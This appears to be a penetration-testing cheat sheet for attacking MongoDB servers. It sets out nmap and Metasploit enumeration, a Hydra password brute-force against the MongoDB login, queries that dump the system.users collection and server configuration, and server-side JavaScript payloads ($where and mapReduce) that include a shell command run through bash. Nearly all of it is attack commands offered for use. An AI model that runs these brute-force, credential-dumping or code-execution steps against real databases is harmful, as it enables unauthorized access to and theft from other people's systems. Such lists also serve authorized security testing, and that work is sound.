- [ ] Mongodb FootPrinting
- [ ] Mongodb Login Brute Force
- [ ] Mongodb Connexion - Basic Commands
- [ ] Mongodb Database Enumeration
- [ ] Mongodb Arbitrary JavaScript Execution

```sh
# nmap
nmap -p 27017,27018 -sC -sV -v IP
nmap -p 27017 --script mongodb-info IP
nmap -p 27017 --script mongodb-databases IP
# msf
use auxiliary/scanner/mongodb/mongodb_info
use auxiliary/scanner/mongodb/mongodb_enum
```
Mongodb Login Brute Force!!!
```sh
# hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt IP mongodb
# nmap
nmap -p 27017 --script mongodb-brute IP
# msf
use auxiliary/scanner/mongodb/mongodb_login
```
Mongodb Connexion - Basic Commands!!!
```sh
# mongo shell
mongo <target-ip>:<port>
mongosh "mongodb://<target-ip>:<port>"
# basic
db.version()
db.serverStatus()
db.serverBuildInfo()
db.hostInfo()
db.adminCommand({getCmdLineOpts: 1})
```
Mongodb Database Enumeration!!!
```sh
# curent user privs
db.runCommand({connectionStatus: 1})   
db.getRoles({showBuiltinRoles: true})
# all users
use admin  
db.system.users.find()  
db.getUsers()
db.adminCommand({usersInfo: {forAllDBs: true}}
# databases and collections
show dbs  
db.adminCommand('listDatabases')  
use database_name   
show collections  
db.getCollectionNames()    
db.collection_name.stats()  
db.collection_name.count()
# configurations
db.adminCommand({getParameter: '*'})  +
// Authentication mechanisms  
db.adminCommand({getParameter: 1, authenticationMechanisms: 1})  
  
// Network settings  
db.adminCommand({getParameter: 1, bindIp: 1})  
db.adminCommand({getParameter: 1, port: 1})  
  
// Check if authentication is enabled  
db.adminCommand({getCmdLineOpts: 1}).parsed.security
```
Mongodb Arbitrary JavaScript Execution!!!
```js
// 1
db.collection.find({$where: "sleep(5000) || true"})
// 2
db.collection.find({$where: function() {
    var cmd = "whoami";
    var output = run("bash", "-c", cmd);
    return true;
}})
// 3
db.collection.mapReduce(
    function() { emit(this._id, this); },
    function(key, values) { 
        // Malicious code
        return "pwned";
    },
    {out: {inline: 1}}
)
```